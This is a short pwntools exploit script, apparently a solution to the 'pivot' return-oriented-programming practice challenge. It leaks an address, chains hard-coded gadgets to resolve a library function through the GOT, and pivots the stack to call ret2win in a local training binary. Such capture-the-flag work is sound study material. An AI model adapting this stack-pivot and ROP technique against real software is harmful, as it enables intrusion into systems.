from pwn import *

r = process('/root/Desktop/pivot')

elf = ELF('/root/Desktop/pivot')
foothold_plt = elf.plt['foothold_function']
foothold_got = elf.got['foothold_function']

lib = ELF('/root/libpivot.so')
sym_foothold = lib.symbols['foothold_function']
sym_ret2win = lib.symbols['ret2win']
offset = int(sym_ret2win - sym_foothold)

leak = int(r.recv().split()[20],16)

pop_rax = 0x400b00
pop_rbp = 0x400900
mov_rax_rax = 0x400b05
add_rax_rbp = 0x400b09
xchg_rax_rsp = 0x400b02
call_rax = 0x040098e



exploit_1 = p64(foothold_plt)
exploit_1 += p64(pop_rax)
exploit_1 += p64(foothold_got)
exploit_1 += p64(mov_rax_rax)
exploit_1 += p64(pop_rbp)
exploit_1 += p64(offset)
exploit_1 += p64(add_rax_rbp)
exploit_1 += p64(call_rax)
 
r.sendline(exploit_1)

exploit_2 = "\x90" * 40
exploit_2 += p64(pop_rax)
exploit_2 += p64(leak)
exploit_2 += p64(xchg_rax_rsp)
exploit_2 += p64(call_rax)

r.sendline(exploit_2)

print r.recvall()
